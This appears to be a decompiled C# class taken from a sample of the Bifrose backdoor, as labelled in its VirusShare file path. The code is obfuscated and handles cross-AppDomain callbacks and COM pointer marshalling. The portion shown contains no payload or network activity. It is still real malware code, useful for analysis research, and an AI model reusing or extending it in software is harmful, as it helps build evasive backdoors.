// Decompiled with JetBrains decompiler
// Type: é.ß
// Assembly: Cursor, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4B47A1CB-CB7F-48AE-B796-614CD24341D7
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.Bifrose.fxv-14b227d022eb752efd3a6dac77892f6ea5968bbf4386c8dce055b7a02a4860f4.exe

using \u0081é;
using \u0082\u00BC;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0081é
{
  [Serializable]
  internal class \u0081ß
  {
    private IntPtr \u0081\u0081;
    private int \u0092;
    [NonSerialized]
    private AppDomain ý;

    public \u0081ß(AppDomain domain, int domainId)
    {
      this.\u0092 = domainId;
      this.ý = domain;
      this.\u0081\u0081 = IntPtr.Zero;
    }

    public void \u0081ý()
    {
      if (this.ý == null)
        return;
      try
      {
        for (int index = 0; index < 10; ++index)
        {
          try
          {
            string friendlyName = this.ý.FriendlyName;
            Thread.Sleep(50);
          }
          catch (AppDomainUnloadedException ex)
          {
            break;
          }
        }
      }
      finally
      {
        \u0082\u00BB.\u0095(this.\u0092);
      }
    }

    public static AppDomain \u0081\u008E()
    {
      MethodInfo method = typeof (AppDomain).GetMethod("GetDefaultDomain", BindingFlags.Static | BindingFlags.NonPublic);
      return (object) method == null ? (AppDomain) null : method.Invoke((object) null, (object[]) null) as AppDomain;
    }

    public void \u009D()
    {
      Marshal.GetObjectForIUnknown(this.\u0081\u0081);
      Marshal.Release(this.\u0081\u0081);
      this.\u0081\u0081 = IntPtr.Zero;
      new Thread(new ThreadStart(this.\u0081ý)).Start();
    }

    public void \u0098(object _param1, EventArgs _param2)
    {
      AppDomain appDomain = \u0081ß.\u0081\u008E();
      if (appDomain == null)
        return;
      CrossAppDomainDelegate callBackDelegate = new CrossAppDomainDelegate(this.\u009D);
      this.\u0081\u0081 = Marshal.GetIUnknownForObject((object) this.ý);
      this.ý = (AppDomain) null;
      appDomain.DoCallBack(callBackDelegate);
    }
  }
}
